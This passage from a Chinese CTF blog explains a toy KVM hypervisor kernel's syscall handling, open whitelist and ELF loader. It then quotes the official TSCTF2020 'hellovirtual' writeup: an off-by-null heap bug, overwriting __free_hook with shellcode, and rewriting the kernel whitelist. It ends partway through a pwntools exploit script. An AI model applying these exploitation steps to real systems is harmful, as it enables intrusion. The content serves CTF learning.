class="line">  hp_write(<span class="number">2</span>, physical(sys), <span class="built_in">strlen</span>(sys));</span><br><span class="line">  hp_write(<span class="number">2</span>, physical(<span class="string">"("</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strcmp</span>(sys, <span class="string">"unsupported"</span>) == <span class="number">0</span>) &#123; dump_val(nr); hp_write(<span class="number">2</span>, physical(<span class="string">")\n"</span>), <span class="number">2</span>); &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span>(nr &gt; MAX_SYS_NR || syscall_table[nr] == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> -ENOSYS;</span><br><span class="line">  <span class="keyword">void</span> *fptr = (<span class="keyword">void</span>*) ((<span class="keyword">uint64_t</span>) syscall_table[nr] | KERNEL_BASE_OFFSET);</span><br><span class="line">  <span class="keyword">uint64_t</span> ret = ((<span class="keyword">uint64_t</span>(*)(                    <span class="comment">//进入对应系统调用号的处理函数</span></span><br><span class="line">        <span class="keyword">uint64_t</span>, <span class="keyword">uint64_t</span>, <span class="keyword">uint64_t</span>,</span><br><span class="line">        <span class="keyword">uint64_t</span>, <span class="keyword">uint64_t</span>, <span class="keyword">uint64_t</span>)) fptr)(</span><br><span class="line">    arg0, arg1, arg2,</span><br><span class="line">    arg3, arg4, arg5</span><br><span class="line">    );</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">  dump_val(arg0);</span><br><span class="line">  hp_write(<span class="number">2</span>, physical(<span class="string">", "</span>), <span class="number">2</span>);</span><br><span class="line">  dump_val(arg1);</span><br><span class="line">  hp_write(<span class="number">2</span>, physical(<span class="string">", "</span>), <span class="number">2</span>);</span><br><span class="line">  dump_val(arg2);</span><br><span class="line">  hp_write(<span class="number">2</span>, physical(<span class="string">") = "</span>), <span class="number">4</span>);</span><br><span class="line">  dump_val(ret);</span><br><span class="line">  hp_write(<span class="number">2</span>, physical(<span class="string">"\n"</span>), <span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以<code>open</code>为例，当我们调用<code>open</code>系统调用时，<code>kernel</code>会进入<code>sys_open</code>函数，我们可以在其中加白名单限制用户可以打开的文件，因为打开文件涉及到硬件，所以肯定需要<code>hypercall</code>配合的，所以最后会进入<code>hp_open</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!access_string_ok(path)) <span class="keyword">return</span> -EFAULT;</span><br><span class="line">  <span class="keyword">void</span> *dst = copy_str_from_user(path);</span><br><span class="line">  <span class="keyword">if</span>(dst == <span class="number">0</span>) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* do whitelist here */</span></span><br><span class="line">  <span class="keyword">if</span>(!(</span><br><span class="line">#define OK(str) <span class="built_in">strcmp</span>(dst, #str) == <span class="number">0</span></span><br><span class="line">      OK(ld.so<span class="number">.2</span>) ||</span><br><span class="line">      <span class="comment">/* OK(/lib64/ld-linux-x86-64.so.2) || */</span></span><br><span class="line">      <span class="comment">/* OK(libc.so.6) || */</span></span><br><span class="line">      <span class="comment">/* OK(./bc.so.6) || */</span></span><br><span class="line">      OK(/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>) ||</span><br><span class="line">      OK(/proc/sys/kernel/osrelease) ||</span><br><span class="line">      OK(/etc/ld.so.cache) ||</span><br><span class="line">      OK(./user.elf) ||</span><br><span class="line">      <span class="comment">/* OK(/bin/cat) || */</span></span><br><span class="line">      OK(flag)</span><br><span class="line">#undef OK</span><br><span class="line">      )) <span class="keyword">return</span> -ENOENT;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> fd = hp_open(physical(dst));</span><br><span class="line">  kfree(dst);</span><br><span class="line">  <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>hp_open</code>函数中会调用<code>hypercall</code>函数，传入端口号<code>0x8000</code>和文件名参数，<code>hypercall</code>中会通过<code>IN/OUT</code>指令访问硬件端口，然后会被<code>kvm</code>监测到，进而退出<code>kvm(KVM_EXIT_IO)</code>，交由<code>hp_handler_open</code>处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hp_open</span><span class="params">(<span class="keyword">uint64_t</span> paddr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> hypercall(NR_HP_open, (<span class="keyword">uint32_t</span>) paddr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int32_t</span> hypercall(<span class="keyword">uint16_t</span> port, <span class="keyword">uint32_t</span> data) &#123;</span><br><span class="line">  <span class="keyword">int32_t</span> ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">"mov dx, %[port];"</span></span><br><span class="line">    <span class="string">"mov eax, %[data];"</span></span><br><span class="line">    <span class="string">"out dx, eax;"</span></span><br><span class="line">    <span class="string">"in eax, dx;"</span></span><br><span class="line">    <span class="string">"mov %[ret], eax;"</span></span><br><span class="line">    : [ret] <span class="string">"=r"</span>(ret)</span><br><span class="line">    : [port] <span class="string">"r"</span>(port), [data] <span class="string">"r"</span>(data)</span><br><span class="line">    : <span class="string">"rax"</span>, <span class="string">"rdx"</span></span><br><span class="line">    );</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hp_handle_open</span><span class="params">(VM *vm)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">int</span> ret = UNUSED_VAR;</span><br><span class="line">  PROCESS &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset = FETCH_U32;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *filename = (<span class="keyword">char</span>*) MEM_AT(offset);</span><br><span class="line">    <span class="keyword">uint32_t</span> end = offset + <span class="built_in">strlen</span>(filename);</span><br><span class="line">    CHECK_OOB(end);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* puts(filename); */</span></span><br><span class="line">    MAY_INIT_FD_MAP();</span><br><span class="line">    <span class="keyword">int</span> min_fd;</span><br><span class="line">    <span class="keyword">for</span>(min_fd = <span class="number">0</span>; min_fd &lt;= MAX_FD; min_fd++)</span><br><span class="line">      <span class="keyword">if</span>(fd_map[min_fd].opening == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span>(min_fd &gt; MAX_FD) ret = -ENFILE;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">int</span> fd = open(filename, O_RDONLY, <span class="number">0</span>);  <span class="comment">//真正打开文件的地方</span></span><br><span class="line">      <span class="keyword">if</span>(fd &lt; <span class="number">0</span>) ret = -errno;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        fd_map[min_fd].real_fd = fd;</span><br><span class="line">        fd_map[min_fd].opening = <span class="number">1</span>;</span><br><span class="line">        ret = min_fd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; THEN_RETURN(ret);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外需要关注的地方就是用户态程序的加载启动，其需要对<code>ELF</code>的结构非常熟悉，可以参考<code>Linux</code>内核中的<code>load_elf_binary</code>函数：</p>
<p><a href="https://code.woboq.org/linux/linux/fs/binfmt_elf.c.html#load_elf_binary" target="_blank" rel="noopener">https://code.woboq.org/linux/linux/fs/binfmt_elf.c.html#load_elf_binary</a></p>
<p>此项目中就是将文件内容读出存入内存，找到<code>entry</code>等重要信息存到一个<code>process</code>结构体中，然后设置好堆栈的起始和大小以及<code>rsp</code>的位置，再在堆栈上布置好环境变量，然后用汇编代码布置好重要寄存器(<code>rcx(返回用户态后会作为rip,所以要提前设置为entry)/rsp</code>)等参数，最后调用<code>sysret</code>指令返回用户态执行程序即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">load_binary</span><span class="params">(<span class="keyword">int</span> fd, process* p)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf = kmalloc(<span class="number">0x1000</span>, MALLOC_NO_ALIGN);</span><br><span class="line">  hp_read(fd, physical(buf), <span class="number">0x1000</span>);</span><br><span class="line">  Elf64_Ehdr *ehdr = (Elf64_Ehdr*) buf;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">memcmp</span>(ehdr-&gt;e_ident, <span class="string">"\177ELF\x02\x01\x01\0\0\0\0\0\0\0\0\0"</span>, <span class="number">16</span>) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> -ENOEXEC;</span><br><span class="line">  p-&gt;entry = ehdr-&gt;e_entry;</span><br><span class="line">  p-&gt;load_addr = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>(ehdr-&gt;e_type != ET_EXEC &amp;&amp; ehdr-&gt;e_type != ET_DYN) <span class="keyword">return</span> -ENOEXEC;</span><br><span class="line">  <span class="keyword">if</span>(ehdr-&gt;e_type == ET_DYN) p-&gt;load_addr = <span class="number">0x0000555555554000</span>ull + (random() % <span class="number">0x1f987651</span>u) * <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">if</span>(ehdr-&gt;e_phoff != <span class="keyword">sizeof</span>(*ehdr)) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span>(ehdr-&gt;e_phentsize != <span class="keyword">sizeof</span>(Elf64_Phdr)) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span>(ehdr-&gt;e_phoff + (<span class="keyword">uint64_t</span>) ehdr-&gt;e_phentsize * ehdr-&gt;e_phnum &gt; <span class="number">0x1000</span>)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  Elf64_Phdr *phdr = (Elf64_Phdr*) ((<span class="keyword">uint8_t</span>*) buf + ehdr-&gt;e_phoff);</span><br><span class="line">  brk_end = <span class="number">0</span>;</span><br><span class="line">  p-&gt;phnum = ehdr-&gt;e_phnum;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ehdr-&gt;e_phnum; i++, phdr++)</span><br><span class="line">    <span class="keyword">if</span>(phdr-&gt;p_type == PT_LOAD) &#123;</span><br><span class="line">      <span class="keyword">uint64_t</span> sz = phdr-&gt;p_filesz;</span><br><span class="line">      <span class="keyword">uint64_t</span> st = p-&gt;load_addr + aligndown(phdr-&gt;p_vaddr),</span><br><span class="line">               ed = p-&gt;load_addr + alignup(phdr-&gt;p_vaddr + sz);</span><br><span class="line">      <span class="keyword">int</span> prot = pf_to_prot(phdr-&gt;p_flags);</span><br><span class="line">      <span class="comment">/* not a good idea, but it works */</span></span><br><span class="line">      <span class="keyword">void</span> *r = sys_mmap(</span><br><span class="line">        (<span class="keyword">void</span>*) st, sz + (phdr-&gt;p_offset &amp; <span class="number">0xfff</span>), prot,</span><br><span class="line">        MAP_FIXED, fd, phdr-&gt;p_offset &amp; <span class="number">-0x1000</span></span><br><span class="line">      );</span><br><span class="line">      <span class="keyword">if</span>(r != (<span class="keyword">void</span>*) st) <span class="keyword">return</span> (<span class="keyword">int</span>) (<span class="keyword">int64_t</span>) r; <span class="comment">// error returned by sys_mmap</span></span><br><span class="line"></span><br><span class="line">      brk_end = MAX(brk_end, ed);</span><br><span class="line">      <span class="keyword">if</span>(phdr-&gt;p_memsz &gt; sz) &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> bss_ed = p-&gt;load_addr + alignup(phdr-&gt;p_vaddr + phdr-&gt;p_memsz);</span><br><span class="line">        <span class="keyword">if</span>(bss_ed != ed) &#123;</span><br><span class="line">          <span class="keyword">if</span>(mmap((<span class="keyword">void</span>*) ed, bss_ed - ed, prot) != (<span class="keyword">void</span>*) ed)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        &#125;</span><br><span class="line">        brk_end = MAX(brk_end, bss_ed);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* set up stack */</span></span><br><span class="line">  p-&gt;stack_base = <span class="number">0x00007ffffffff000</span>ull - (random() % <span class="number">0x7331</span>) * <span class="number">0x1000</span>;</span><br><span class="line">  p-&gt;stack_size = <span class="number">0x40000</span>;</span><br><span class="line">  p-&gt;rsp = p-&gt;stack_base - <span class="number">0x1000</span> - (random() % <span class="number">0xff</span> * <span class="number">0x10</span>);</span><br><span class="line">  <span class="keyword">void</span> *st = (<span class="keyword">void</span>*) (p-&gt;stack_base - p-&gt;stack_size);</span><br><span class="line">  <span class="keyword">if</span>(mmap(st, p-&gt;stack_size, PROT_RW) != st) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//=====================================================================================</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd = sys_open(path);</span><br><span class="line">  <span class="keyword">if</span>(fd &lt; <span class="number">0</span>) <span class="keyword">return</span> fd;</span><br><span class="line">  process p = &#123;&#125;;</span><br><span class="line">  <span class="keyword">int</span> ret = load_binary(fd, &amp;p);</span><br><span class="line">  <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) <span class="keyword">return</span> ret;</span><br><span class="line">  sys_close(fd);</span><br><span class="line">  p.filename = copy_str_from_user(path);</span><br><span class="line">  <span class="keyword">if</span>(create_elf_info(&amp;p, argv, envp)) <span class="keyword">return</span> -EFAULT;</span><br><span class="line">  <span class="comment">/* this is an execve call so we can ignore the saved registers (rip, rsp) */</span></span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"mov [rip + kernel_stack], rsp;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"mov rcx, %[entry];"</span> <span class="comment">/* rip */</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"mov r11, 0x2;"</span>      <span class="comment">/* rflags */</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"mov rsp, %[rsp];"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">/* clean up registers */</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"xor rax, rax;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"xor rbx, rbx;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"xor rdx, rdx;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"xor rdi, rdi;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"xor rsi, rsi;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"xor rbp, rbp;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"xor r8, r8;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"xor r9, r9;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"xor r10, r10;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"xor r12, r12;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"xor r13, r13;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"xor r14, r14;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"xor r15, r15;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"xor rbp, rbp;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">".byte 0x48;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"sysret"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    :: [entry]<span class="string">"r"</span>(p.entry + p.load_addr), [rsp]<span class="string">"r"</span>(p.rsp)</span></span></span><br><span class="line"><span class="function"><span class="params">    : <span class="string">"r11"</span>, <span class="string">"rcx"</span></span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br><span class="line">  <span class="comment">/* never reached */</span></span><br><span class="line">  <span class="keyword">return</span> -EPERM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="TSCTF2020-hellovirtual"><a href="#TSCTF2020-hellovirtual" class="headerlink" title="TSCTF2020_hellovirtual"></a>TSCTF2020_hellovirtual</h1><p>从官方wp复制下来的。</p>
<h2 id="hellovirtual-hellouser"><a href="#hellovirtual-hellouser" class="headerlink" title="hellovirtual:hellouser"></a>hellovirtual:hellouser</h2><p><code>hellovirtual</code>这道题是我设计比较久的一道题，混合了<code>glibcpwn</code>,<code>kernel</code>和虚拟化的元素，此题分为两层，第一层需要先<code>pwn</code>掉<code>hellouser</code>(<code>hellokernel</code>装载的用户态程序)获得用户空间任意代码执行的能力，与<code>hellokernel</code>交互并理解<code>hook</code>函数逻辑进而获得<code>flag</code>，第二层需要<code>pwn</code>掉<code>hellokernel</code>(<code>hellovirtual</code>装载的内核)获得内核空间任意地址写任意值的能力去改写<code>sys_open</code>中的白名单限制，进而打开<code>flag_xmzyshypnctql</code>文件获取其内容，最初还想在<code>hellovirtual</code>里再设一层的，但是最后因为出题时间不太够了，校内赛也没这个必要。</p>
<p>用户态程序<code>hellouser</code>本身难度很低，难点在于和<code>hellokernel</code>的交汇处，也就是如何通过系统调用获取到<code>flag</code>文件的内容，因为<code>hellokernel</code>的逆向是一个很大的难点，但是在之后放出<code>hellokernel.i64</code>之后，此题难度已经降了许多，最后只有一解是有点出乎我的意料，可能大家都被<code>kvm</code>吓到了或者在肝其他题吧hh。</p>
<p><strong><code>hellouser</code>的漏洞点位于<code>sprintf</code>的<code>off-by-null</code>,在<code>idx</code>为<code>10</code>时触发</strong>，其可以将紧跟在其后的<code>teamslogan</code>指针的最后一位覆盖为<code>\x00</code>，然后利用<code>edit_teamslogan</code>去往堆前写，进而做到修改其他结构体<code>teamslogan</code>指针的效果，进而做到任意地址写任意值的效果，解法挺多的也都不难。</p>
<p><strong>此外在<code>hint1</code>中已经放出<code>kvm</code>的<code>vcpu</code>的<code>EFER.NXE</code>标志位未设置为1</strong>，也就是实际上是可以执行<code>shellcode</code>的，其实只做<code>hellouser</code>的话用<code>rop</code>已经足够了，执行<code>shellcode</code>主要是为了<code>pwn</code> <code>hellokernel</code>时比较方便。</p>
<p><strong>预期解</strong>：先用后门泄露出<code>codebase</code>，然后利用漏洞改前一个结构体的<code>teamslogan</code>为次数限制变量的地址，然后再<code>edit_teamslogan</code>突破次数限制，再泄露出<code>stack</code>和<code>libc</code>，然后改<code>__free_hook</code>为<code>shellcode</code>地址，最后<code>free</code>触发即可。</p>
<p><strong>关于与<code>hellokernel</code>的交互处</strong>：我们在<code>hellokernel.i64</code>中搜索<code>flag</code>字符串可以发现在<code>sys_open</code>中对<code>flag</code>字符串进行了<code>hook</code>，进而去分析<code>hook</code>函数可以发现其先用<code>hp_read</code>将<code>flag</code>读到了一块用<code>mmap</code>申请出的内存中，然后用<code>mprotect</code>将这块地址的权限变为只可写，然后将这块地址返回给用户态，所以我们在用户态接收到这个地址之后需要先用<code>mprotect</code>将其权限改为可读，然后再用<code>write</code>输出出来即可。</p>
<p><img src="https://s3.ax1x.com/2021/02/27/6pNPmV.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys,os,string</span><br><span class="line"></span><br><span class="line"><span class="comment">#elf_path = './hellouser'</span></span><br><span class="line">elf_path = <span class="string">'./hellovirtual ./hellokernel ./ld.so.2 ./hellouser'</span>.split(<span class="string">' '</span>)</span><br><span class="line">remote_libc_path = <span class="string">'./libc.so.6'</span></span><br><span class="line"></span><br><span class="line">ip = <span class="string">'10.104.255.213'</span></span><br><span class="line">port = <span class="number">8888</span></span><br><span class="line"><span class="comment">#P = ELF(elf_path)</span></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.terminal = ['terminator','-x','sh','-c']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">	p = process(elf_path)</span><br><span class="line">	<span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(ip,port)</span><br><span class="line">	libc = ELF(remote_libc_path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(name,size,slogan)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'[+]your choice:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your team name:\n'</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your team slogan size:\n'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your team slogan:\n'</span>)</span><br><span class="line">    p.send(slogan)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'[+]your choice:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your team id:\n'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_slogan</span><span class="params">(idx,slogan)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'[+]your choice:\n'</span>)</span><br><span class="line">    